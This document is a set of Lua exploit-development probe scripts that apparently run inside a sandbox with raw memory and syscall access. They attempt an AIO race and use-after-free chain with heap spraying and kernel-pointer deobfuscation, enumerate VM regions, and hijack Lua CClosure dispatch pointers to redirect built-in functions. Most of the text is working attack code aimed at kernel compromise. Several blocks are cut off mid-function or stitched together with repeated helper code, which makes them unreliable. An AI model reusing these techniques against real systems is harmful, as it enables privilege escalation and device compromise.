## probes/phase14_final_push/55e_aio_race.lua

```lua
-- CRASH_CLASS: HIGH
-- PROBE 55e: AIO race condition / use-after-free chain
--
-- Prerequisites: 54c/53a showed AIO syscalls 661-670 survive
-- Strategy:
--   1. Rapid AIO submit to trigger race conditions in kernel
--   2. Deobfuscate any returned kernel pointers
--   3. Submit-then-close for use-after-free on kernel AIO struct
--   4. Stack clash via 32-bit LEA overflow (count=0x40000001)
--   5. Heap spray to reclaim freed kernel buffers

print("=== PROBE 55e: AIO RACE / UAF CHAIN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

-- Pointer deobfuscation: f(x) = x ^ (x >> 4), reversed nibble-by-nibble from MSB
local function deobfuscate_ptr(val)
    local h, l = get_hi_lo(val)
    -- Work on 16 nibbles (64 bits)
    local nibbles = {}
    for i = 15, 0, -1 do
        local shift = i * 4
        if i >= 8 then
            local n = math.floor(h / (2^((i-8)*4))) % 16
            nibbles[i] = n
        else
            local n = math.floor(l / (2^(i*4))) % 16
            nibbles[i] = n
        end
    end
    -- Reverse: top nibble is unchanged, each next = enc ^ prev_decoded
    local decoded = {}
    decoded[15] = nibbles[15]  -- MSB nibble passes through
    for i = 14, 0, -1 do
        decoded[i] = (nibbles[i] ~ decoded[i+1]) % 16
    end
    -- Reconstruct
    local rh, rl = 0, 0
    for i = 15, 8, -1 do rh = rh * 16 + decoded[i] end
    for i = 7, 0, -1 do rl = rl * 16 + decoded[i] end
    return rh, rl
end

local sc661 = make_syscall(661)  -- aio_submit
local sc662 = make_syscall(662)  -- aio_multi
local sc663 = make_syscall(663)  -- aio_wait
local sc664 = make_syscall(664)  -- aio_cancel
local sc665 = make_syscall(665)  -- aio_error
local sc666 = make_syscall(666)  -- aio_result
local sc6   = make_syscall(6)    -- close
local sc_mmap = make_syscall(477)

-- ============================================================
-- Phase 1: Test AIO survival with basic args
-- ============================================================
print("[*] Phase 1: AIO survival check")

local aio_buf = memory.alloc(0x200)
for i = 0, 0x1FF, 4 do safe_wd(aio_buf + i, 0) end

local survived = {}
for _, sc_num in ipairs({661,662,663,664,665,666,667,668,669,670}) do
    local sc = make_syscall(sc_num)
    local ok, ret = pcall(function()
        return sc(uint64(aio_buf), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        survived[sc_num] = signed32(ret)
        print(string.format("  sys %d: ret=%d", sc_num, signed32(ret)))
    else
        print(string.format("  sys %d: CRASHED", sc_num))
    end
end
print("")

-- ============================================================
-- Phase 2: Scan AIO return buffers for obfuscated kernel pointers
-- ============================================================
print("[*] Phase 2: Scan output buffers for obfuscated pointers")

for _, sc_num in ipairs({661,662,663,664,665,666}) do
    if survived[sc_num] ~= nil then
        local sc = make_syscall(sc_num)
        local buf = memory.alloc(0x200)
        for i = 0, 0x1FF, 4 do safe_wd(buf + i, 0xDEADBEEF) end

        pcall(function()
            return sc(uint64(buf), uint64(0x100), uint64(5), uint64(buf + 0x100), uint64(0))
        end)

        -- Scan buffer for changed values
        for off = 0, 0x1F8, 8 do
            local q = safe_rq(buf + off)
            if q then
                local h, l = get_hi_lo(q)
                if h ~= 0xDEADBEEF and (h ~= 0 or l ~= 0) then
                    -- Try deobfuscation
                    local dh, dl = deobfuscate_ptr(q)
                    local is_kptr = (dh >= 0xFFFF8000 and dh < 0xFFFFFFFF)
                    print(string.format("  sys%d +0x%03X: raw=%s  deobf=0x%08X_%08X%s",
                        sc_num, off, hexval(q), dh, dl,
                        is_kptr and "  <<< KERNEL PTR!" or ""))

        end

-- Kernel allocates tiny buffer, but loops over huge count → stack/heap overflow

local crash_buf = memory.alloc(0x100)
for i = 0, 0xFF, 4 do safe_wd(crash_buf + i, 0) end

    local ok5, ret5 = pcall(function() return sc6(uint64(pfd_r)) end)
    print("  close(fd) = " .. (ok5 and tostring(signed32(ret5)) or "CRASH"))

    local ok6, ret6 = pcall(function()
        return sc665(uint64(aiocb), uint64(0))  -- aio_error
    end)
    print("  aio_error after close: " .. (ok6 and tostring(signed32(ret6)) or "CRASH"))

    -- Check if anything was written to our read_target
    for off = 0, 0x78, 8 do
        local q = safe_rq(read_target + off)
        if q then
            local h, l = get_hi_lo(q)
            if h ~= 0 or l ~= 0 then

                    off, hexval(q), dh, dl,
                    (dh >= 0xFFFF8000 and dh < 0xFFFFFFFF) and " <<< KERNEL PTR!" or ""))
            end
        end
    end

    local spray = {}
    for i = 1, 32 do

                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)

            for off = 0, 0x3FF0, 8 do

    local ok8, ret8 = pcall(function()
        return sc665(uint64(aiocb), uint64(0))
    end)

end

    -- Immediately cancel
    local ok_c, _ = pcall(function() return sc664(uint64(cb), uint64(0), uint64(0), uint64(0)) end)

    if ok_s and ok_c then race_count = race_count + 1 end
end
```

```lua
    if type(v) == "table" and v.tonumber then return v:tonumber() end

local function make_syscall(num)

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X_%08X", h, l)
end

local sc674 = make_syscall(674)

-- ============================================================
```

```lua
do
    local STRIDE = 72
    local MAX = 512
    local buf = memory.alloc(STRIDE * MAX + 0x100)
    -- Zero the entire buffer
    for i = 0, STRIDE * 32 - 1, 4 do safe_wd(buf + i, 0) end
    local countp = memory.alloc(16)
    safe_wq(countp, uint64(0))

    local ok, ret = pcall(function()
        return sc674(uint64(buf), uint64(STRIDE), uint64(MAX),
                      uint64(countp), uint64(0x40000000))
    end)

        return
    end
    print("  ret: " .. hexval(ret))
    local count = safe_rd(countp) or 0
    print("  total regions: " .. count)

    -- Dump first 30 records completely
    local dump_count = 30
    if dump_count > count then dump_count = count end
    if dump_count > MAX then dump_count = MAX end

    for i = 0, dump_count - 1 do
        local base = buf + i * STRIDE
        local line = string.format("  [%03d]", i)
        for d = 0, 17 do
            local v = safe_rd(base + d * 4) or 0
            line = line .. string.format(" %08X", v)
        end
        print(line)
    end

    -- ============================================================
    -- [B] Identify field layout by analyzing patterns
    -- ============================================================
    print("")
    print("[B] Field analysis")

    -- For each dword position, find how many records have nonzero values
    local nonzero_counts = {}
    local limit = count
    if limit > MAX then limit = MAX end
    for d = 0, 17 do
        local nz = 0
        for i = 0, limit - 1 do
            local v = safe_rd(buf + i * STRIDE + d * 4) or 0
            if v ~= 0 then nz = nz + 1 end
        end
        nonzero_counts[d] = nz
    end

    for d = 0, 17 do
        local pct = math.floor(nonzero_counts[d] * 100 / limit)
        if nonzero_counts[d] > 0 then
            print(string.format("    dword[%2d] (+0x%02X): %d nonzero (%d%%)",
                d, d * 4, nonzero_counts[d], pct))
        end
    end

    -- ============================================================
    -- [C] Kernel pointer scan across ALL 72 bytes (every qword alignment)
    -- ============================================================
    print("")
    print("[C] Full kernel pointer scan (all qword offsets)")
    local kptr_found = false
    for i = 0, limit - 1 do
        local base = buf + i * STRIDE
        for off = 0, 64, 4 do
            local lo = safe_rd(base + off)
            local hi = safe_rd(base + off + 4)
            if hi and hi >= 0xFFFF8000 and lo and lo ~= 0 then
                -- Filter out sentinels
                if not (hi == 0xFFFFFFFF and (lo == 0 or lo == 0xFFFFFFFF)) then
                    print(string.format("  rec[%d]+0x%02X: 0x%08X_%08X  <<< KERNEL PTR!",
                        i, off, hi, lo))
                    kptr_found = true
                end
            end
        end
    end
    if not kptr_found then
        print("  no kernel pointers found")
    end

    -- ============================================================
    -- [D] Look for records with high addresses (kernel VA space)
    -- Check qword[0] (presumed start addr) for kernel range
    -- ============================================================
    print("")
    print("[D] Records with addresses > 0x800000000000")
    for i = 0, limit - 1 do
        local base = buf + i * STRIDE
        -- Check first qword as address
        local lo = safe_rd(base) or 0
        local hi = safe_rd(base + 4) or 0
        if hi >= 0x8000 then
            print(string.format("  rec[%d] start: 0x%08X_%08X", i, hi, lo))
        end
        -- Check second qword as end address
        lo = safe_rd(base + 8) or 0
        hi = safe_rd(base + 12) or 0
        if hi >= 0x8000 then
            print(string.format("  rec[%d] end:   0x%08X_%08X", i, hi, lo))
        end
    end

    -- ============================================================
    -- [E] Try larger stride to see if there's more data per record
    -- Maybe 72 bytes isn't capturing everything
    -- ============================================================
    print("")
    print("[E] Test with stride=128 (extra padding)")
    local buf2 = memory.alloc(128 * 32)
    for i = 0, 128 * 4 - 1, 4 do safe_wd(buf2 + i, 0) end
    local countp2 = memory.alloc(16)
    safe_wq(countp2, uint64(0))

    local ok2, ret2 = pcall(function()
        return sc674(uint64(buf2), uint64(128), uint64(32),
                      uint64(countp2), uint64(0x40000000))
    end)
    if ok2 then
        print("  ret: " .. hexval(ret2))
        local c2 = safe_rd(countp2) or 0
        print("  count: " .. c2)
        -- Compare first record at stride 72 vs 128
        print("  stride=72 rec[0]:")
        local line1 = "   "
        for d = 0, 17 do
            line1 = line1 .. string.format(" %08X", safe_rd(buf + d * 4) or 0)
        end
        print(line1)
        print("  stride=128 rec[0]:")
        local line2 = "   "
        for d = 0, 17 do
            line2 = line2 .. string.format(" %08X", safe_rd(buf2 + d * 4) or 0)
        end
        print(line2)
        -- Check bytes 72-127 for extra data
        print("  stride=128 rec[0] bytes 72-127:")
        local extra = "   "
        local any_extra = false
        for d = 18, 31 do
            local v = safe_rd(buf2 + d * 4) or 0
            extra = extra .. string.format(" %08X", v)
            if v ~= 0 then any_extra = true end
        end
        if any_extra then print(extra) end
    end

    -- ============================================================
    -- [F] Second enumeration path: records from 0x80000000000+
    -- RE says there's a second path starting at 0x80000000000
    -- These might be kernel mappings!
    -- Check if any of the 316 records are from that range
    -- ============================================================
    print("")
    print("[F] Records analysis — address ranges")
    local ranges = {userlow=0, userhigh=0, system=0, gpu=0, other=0}
    for i = 0, limit - 1 do
        local base = buf + i * STRIDE
        local lo = safe_rd(base) or 0
        local hi = safe_rd(base + 4) or 0
        if hi == 0 and lo < 0x80000000 then
            ranges.userlow = ranges.userlow + 1
        elseif hi <= 0x0000000F then
            ranges.userhigh = ranges.userhigh + 1
        elseif hi >= 0x80000000 then
            ranges.system = ranges.system + 1
        else
            ranges.other = ranges.other + 1
        end
    end
    print(string.format("  userlow (0-2GB): %d", ranges.userlow))
    print(string.format("  userhigh (2GB-64GB): %d", ranges.userhigh))
    print(string.format("  system (>0x80000000_00000000): %d", ranges.system))
    print(string.format("  other: %d", ranges.other))

    -- ============================================================
    -- [G] Dump last 20 records (highest addresses — most likely to
    -- contain kernel mappings from the second enumeration path)
    -- ============================================================
    print("")
    print("[G] Last 20 records (highest addresses)")
    local start_idx = limit - 20
    if start_idx < 0 then start_idx = 0 end
    for i = start_idx, limit - 1 do
        local base = buf + i * STRIDE
        local line = string.format("  [%03d]", i)
        for d = 0, 17 do
            local v = safe_rd(base + d * 4) or 0
            line = line .. string.format(" %08X", v)
        end
        print(line)
    end
end

print("")
print("=== PROBE 55f COMPLETE ===")
```

```lua
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

    local found = 0
    for off = 0, size - 8, 8 do
```

## probes/phase14_final_push/55g_cclosure_write_diagnostic.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 55g: CClosure +0x20 write hang diagnostic
--
-- Context: 54q hung for 15s when writing a DIFFERENT value to type()'s +0x20.
-- Writing the SAME value back (no-op) succeeded instantly in [A].
-- The hang occurred at the safe_wq call itself, not at the redirected call.
-- This probe investigates:
--   1. What VM region does the CClosure live in? (use sys 674 VM map)
--   2. What protection bits does that region have?
--   3. Does writing +1 to the value also hang? (minimal change)
--   4. Does writing to OTHER CClosure offsets hang? (+0x00, +0x08, +0x10, +0x18)
--   5. Does writing to a DIFFERENT function's +0x20 also hang?
--   6. Timing: how long do writes take?

print("=== PROBE 55g: CCLOSURE WRITE HANG DIAGNOSTIC ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

-- ============================================================
-- [A] Locate CClosure in VM map using sys 674
-- ============================================================
print("[A] CClosure location in VM map")

local type_addr = parse_func_addr(type)
local tonumber_addr = parse_func_addr(tonumber)
local tostring_addr = parse_func_addr(tostring)
print("  type object:     " .. hexval(type_addr))
print("  tonumber object: " .. hexval(tonumber_addr))
print("  tostring object: " .. hexval(tostring_addr))

if not type_addr then
    print("  FAILED to parse type address")
    print("=== PROBE 55g ABORTED ===")
    return
end

local type_h, type_l = get_hi_lo(type_addr)

local sc674 = make_syscall(674)
local STRIDE = 72
local MAX = 512
local buf = memory.alloc(STRIDE * MAX + 0x100)
for i = 0, STRIDE * 4 - 1, 4 do safe_wd(buf + i, 0) end
local countp = memory.alloc(16)
safe_wq(countp, uint64(0))
local ok674, ret674 = pcall(function()
    return sc674(uint64(buf), uint64(STRIDE), uint64(MAX),
                  uint64(countp), uint64(0x40000000))
end)
if ok674 then
    local count = safe_rd(countp) or 0
    print("  VM regions: " .. count)
    local limit = count
    if limit > MAX then limit = MAX end
    for i = 0, limit - 1 do
        local base = buf + i * STRIDE
        local s_lo = safe_rd(base) or 0
        local s_hi = safe_rd(base + 4) or 0
        local e_lo = safe_rd(base + 8) or 0
        local e_hi = safe_rd(base + 12) or 0
        local prot = safe_rd(base + 0x18) or 0
        local flags = safe_rd(base + 0x1C) or 0
        -- Check if type_addr falls in this region
        if s_hi == type_h and e_hi == type_h then
            if type_l >= s_lo and type_l < e_lo then
                local name = ""
                for b = 0, 39 do
                    local byte_off = 0x20 + b
                    local dw = safe_rd(base + (math.floor(byte_off / 4)) * 4) or 0
                    local shift = (byte_off % 4) * 8
                    local ch = math.floor(dw / (2 ^ shift)) % 256
                    if ch >= 0x20 and ch < 0x7F then name = name .. string.char(ch)
                    elseif ch == 0 and #name > 0 then break end
                end
                print(string.format("  MATCH rec[%d]: 0x%08X_%08X - 0x%08X_%08X prot=0x%X flags=0x%X name=%s",
                    i, s_hi, s_lo, e_hi, e_lo, prot, flags, name))
            end
        elseif s_hi <= type_h and e_hi >= type_h then
            if (s_hi < type_h or type_l >= s_lo) and (e_hi > type_h or type_l < e_lo) then
                print(string.format("  MATCH rec[%d]: prot=0x%X flags=0x%X", i, prot, flags))
            end
        end
    end
else
    print("  sys 674 failed")
end

-- ============================================================
-- [B] Read full CClosure layout for type()
-- ============================================================
print("")
print("[B] type() CClosure full layout (10 qwords)")
for off = 0, 0x48, 8 do
    local val = safe_rq(type_addr + off)
    print(string.format("  +0x%02X: %s", off, hexval(val)))
end

-- ============================================================
-- [C] Timed no-op write (same value) to +0x20
-- ============================================================
print("")
print("[C] Timed no-op write to type()+0x20")
local old_val = safe_rq(type_addr + 0x20)
print("  current +0x20: " .. hexval(old_val))
local t0 = os.clock()
local noop_ok = safe_wq(type_addr + 0x20, old_val)
local t1 = os.clock()
print(string.format("  no-op write: ok=%s time=%.4fs", tostring(noop_ok), t1 - t0))
print("  verify type(42): " .. tostring(type(42)))

-- ============================================================
-- [D] Timed writes to OTHER offsets (NOT +0x20) with restore
-- These should be safe based on 53d
-- ============================================================
print("")
print("[D] Timed writes to other CClosure offsets (with restore)")
collectgarbage("stop")
for _, off in ipairs({0x00, 0x08, 0x10, 0x18, 0x28, 0x30}) do
    local orig = safe_rq(type_addr + off)
    if orig then
        t0 = os.clock()
        local w_ok = safe_wq(type_addr + off, orig)
        t1 = os.clock()
        print(string.format("  +0x%02X: no-op ok=%s time=%.4fs val=%s",
            off, tostring(w_ok), t1 - t0, hexval(orig)))
    else
        print(string.format("  +0x%02X: UNREADABLE", off))
    end
end

-- ============================================================
-- [E] Write a DIFFERENT value to +0x18 (env pointer, non-critical)
-- 53d confirmed this is writable. Does a different value hang?
-- ============================================================
print("")
print("[E] Different-value write to +0x18 (with restore)")
local old_18 = safe_rq(type_addr + 0x18)
if old_18 then
    local h18, l18 = get_hi_lo(old_18)
    local modified_18 = uint64(string.format("0x%X%08X", h18, l18 + 1))
    t0 = os.clock()
    local w18 = safe_wq(type_addr + 0x18, modified_18)
    t1 = os.clock()
    print(string.format("  write different: ok=%s time=%.4fs", tostring(w18), t1 - t0))
    -- Restore immediately
    safe_wq(type_addr + 0x18, old_18)
    print("  restored, verify type(42): " .. tostring(type(42)))
else
    print("  +0x18 UNREADABLE")
end

-- ============================================================
-- [F] Write a DIFFERENT value to +0x00 (next pointer)
-- 53d confirmed writable
-- ============================================================
print("")
print("[F] Different-value write to +0x00 (with restore)")
local old_00 = safe_rq(type_addr + 0x00)
if old_00 then
    local h00, l00 = get_hi_lo(old_00)
    local modified_00 = uint64(string.format("0x%X%08X", h00, l00 + 1))
    t0 = os.clock()
    local w00 = safe_wq(type_addr + 0x00, modified_00)
    t1 = os.clock()
    print(string.format("  write different: ok=%s time=%.4fs", tostring(w00), t1 - t0))
    safe_wq(type_addr + 0x00, old_00)
    print("  restored")
else
    print("  +0x00 UNREADABLE")
end

-- ============================================================
-- [G] Write SAME+1 to +0x20 — does +0x20 specifically hang?
-- THIS IS THE KEY TEST. 54q hung here.
-- Using dword writes instead of qword to isolate.
-- ============================================================
print("")
print("[G] DWORD write to +0x20 low half (same value = no-op)")
local old_20_lo = safe_rd(type_addr + 0x20)
local old_20_hi = safe_rd(type_addr + 0x24)
print("  +0x20 lo: " .. string.format("0x%08X", old_20_lo or 0))
print("  +0x24 hi: " .. string.format("0x%08X", old_20_hi or 0))
t0 = os.clock()
local wd_ok = safe_wd(type_addr + 0x20, old_20_lo)
t1 = os.clock()
print(string.format("  dword no-op write +0x20: ok=%s time=%.4fs", tostring(wd_ok), t1 - t0))

-- Now write +1 to the LOW dword only (minimal change)
print("")
print("[H] DWORD write +0x20 low half +1 (DIFFERENT value)")
print("  MARKER_BEFORE_DIFFERENT_WRITE")
t0 = os.clock()
local wd_diff = safe_wd(type_addr + 0x20, old_20_lo + 1)
t1 = os.clock()
print(string.format("  MARKER_AFTER_DIFFERENT_WRITE ok=%s time=%.4fs", tostring(wd_diff), t1 - t0))

-- Restore
safe_wd(type_addr + 0x20, old_20_lo)
print("  restored +0x20")

collectgarbage("restart")
print("  verify type(42): " .. tostring(type(42)))

print("")
print("=== PROBE 55g COMPLETE ===")
```

## probes/phase14_final_push/56a_controlled_redirect.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 56a v2: Controlled CClosure redirect via DWORD writes
--
-- Context: 55g confirmed +0x20 IS the C function dispatch pointer.
-- CRITICAL: qword writes to +0x20 BLOCK (54q, 56a v1 both hung 15-30s).
-- DWORD writes to +0x20 are INSTANT (55g section G/H).
-- This version uses safe_wd for the low dword + safe_wd for the high dword.
--
-- Tests:
--   [C] Redirect type() -> tostring (should return "42" for type(42))
--   [D] Redirect type() -> rawequal (should return boolean)
--   [E] Redirect type() -> select (should return selected args)
--   [F] Cross-redirect: pcall() -> type's C function

print("=== PROBE 56a v2: CONTROLLED REDIRECT (DWORD WRITES) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

-- Write a qword using two dword writes (avoids the qword write hang)
local function write_ptr(addr, new_val)
    local new_h, new_l = get_hi_lo(new_val)
    local ok1 = safe_wd(addr, new_l)
    local ok2 = safe_wd(addr + 4, new_h)
    return ok1 and ok2
end

-- Get addresses of all test functions
local funcs = {
    {name="type",     fn=type},
    {name="tostring", fn=tostring},
    {name="rawget",   fn=rawget},
    {name="select",   fn=select},
    {name="pcall",    fn=pcall},
    {name="rawequal", fn=rawequal},
}

print("[A] Function addresses and +0x20 targets")
for _, f in ipairs(funcs) do
    f.addr = parse_func_addr(f.fn)
    if f.addr then
        f.target = safe_rq(f.addr + 0x20)
        f.target_h, f.target_l = get_hi_lo(f.target)
        print(string.format("  %-10s obj=%s  +0x20=%s", f.name, hexval(f.addr), hexval(f.target)))
    else
        print(string.format("  %-10s FAILED to parse", f.name))
    end
end

local type_addr = funcs[1].addr
local type_orig = funcs[1].target
local type_orig_h, type_orig_l = funcs[1].target_h, funcs[1].target_l
if not type_addr or not type_orig then
    print("FAILED: can't get type address")
    print("=== PROBE 56a ABORTED ===")
    return
end

print("")
print("[B] Baseline")
print("  type(42) = " .. tostring(type(42)))
print("  type('hello') = " .. tostring(type("hello")))
print("  type(nil) = " .. tostring(type(nil)))
print("  type({}) = " .. tostring(type({})))

collectgarbage("stop")

-- ============================================================
-- [C] Redirect type() -> tostring's C function
-- tostring(42) returns "42", so type(42) should return "42"
-- ============================================================
print("")
print("[C] Redirect type() -> tostring (via dword writes)")
local tostring_entry = funcs[2]
if tostring_entry and tostring_entry.target then
    print("  old +0x20: " .. hexval(type_orig))
    print("  new +0x20: " .. hexval(tostring_entry.target))
    local wok = write_ptr(type_addr + 0x20, tostring_entry.target)
    print("  dword write ok=" .. tostring(wok))
    -- Verify the write landed
    local verify = safe_rq(type_addr + 0x20)
    print("  verify +0x20: " .. hexval(verify))
    print("  MARKER_BEFORE_CALL")
    local ok, result = pcall(type, 42)
    print("  MARKER_AFTER_CALL ok=" .. tostring(ok) .. " result=" .. tostring(result))
    if ok then
        local ok2, result2 = pcall(type, "hello")
        print("  type('hello') ok=" .. tostring(ok2) .. " result=" .. tostring(result2))
        local ok3, result3 = pcall(type, nil)
        print("  type(nil) ok=" .. tostring(ok3) .. " result=" .. tostring(result3))
    end
    -- Restore via dword writes
    write_ptr(type_addr + 0x20, type_orig)
    local restored = safe_rq(type_addr + 0x20)
    print("  restored +0x20: " .. hexval(restored))
    print("  verify type(42): " .. tostring(type(42)))
else
    print("  SKIP: no tostring target")
end

-- ============================================================
-- [D] Redirect type() -> rawequal's C function
-- rawequal(a,b) returns boolean
-- ============================================================
print("")
print("[D] Redirect type() -> rawequal (via dword writes)")
local rawequal_entry = funcs[6]
if rawequal_entry and rawequal_entry.target then
    print("  new +0x20: " .. hexval(rawequal_entry.target))
    write_ptr(type_addr + 0x20, rawequal_entry.target)
    print("  MARKER_BEFORE_CALL")
    local ok, result = pcall(type, 42, 42)
    print("  MARKER_AFTER_CALL ok=" .. tostring(ok) .. " result=" .. tostring(result))
    local ok2, result2 = pcall(type, 42, 99)
    print("  type(42,99) ok=" .. tostring(ok2) .. " result=" .. tostring(result2))
    write_ptr(type_addr + 0x20, type_orig)
    print("  restored, verify type(42): " .. tostring(type(42)))
else
    print("  SKIP: no rawequal target")
end

-- ============================================================
-- [E] Redirect type() -> select's C function
-- select(n, ...) returns n-th through last args
-- ============================================================
print("")
print("[E] Redirect type() -> select (via dword writes)")
local select_entry = funcs[4]
if select_entry and select_entry.target then
    print("  new +0x20: " .. hexval(select_entry.target))
    write_ptr(type_addr + 0x20, select_entry.target)
    print("  MARKER_BEFORE_CALL")
    local ok, r1, r2, r3 = pcall(type, 1, "aaa", "bbb", "ccc")
    print("  MARKER_AFTER_CALL ok=" .. tostring(ok))
    if ok then
        print("  r1=" .. tostring(r1) .. " r2=" .. tostring(r2) .. " r3=" .. tostring(r3))
    else
        print("  error: " .. tostring(r1))
    end
    write_ptr(type_addr + 0x20, type_orig)
    print("  restored, verify type(42): " .. tostring(type(42)))
else
    print("  SKIP: no select target")
end

-- ============================================================
-- [F] Timing comparison: dword write vs read
-- ============================================================
print("")
print("[F] Timing: 10 dword write cycles to +0x20")
local tostring_h, tostring_l = tostring_entry.target_h, tostring_entry.target_l
local t0 = os.clock()
for i = 1, 10 do
    safe_wd(type_addr + 0x20, tostring_l)
    safe_wd(type_addr + 0x24, tostring_h)
    safe_wd(type_addr + 0x20, type_orig_l)
    safe_wd(type_addr + 0x24, type_orig_h)
end
local t1 = os.clock()
print(string.format("  10 swap+restore cycles: %.4fs (%.4fs each)", t1 - t0, (t1 - t0) / 10))
print("  verify type(42): " .. tostring(type(42)))

collectgarbage("restart")

print("")
print("=== PROBE 56a v2 COMPLETE ===")
```

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 56b: Minimal CClosure redirect — tightest possible write+call+restore
--

--       If this hangs, the write itself triggers dispatch
--   [B] Try raw memory.write_dword without pcall wrapper
--   [C] Try redirecting tostring() instead of type() — type() may be special
--   [D] Try redirecting rawget() -> rawequal()

    return tonumber(v) or 0
end

    if ok then return to_num(val) end
    return nil

    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

-- Gather function info
local type_addr = parse_func_addr(type)
local tostring_addr = parse_func_addr(tostring)
local rawget_addr = parse_func_addr(rawget)
local rawequal_addr = parse_func_addr(rawequal)
local select_addr = parse_func_addr(select)
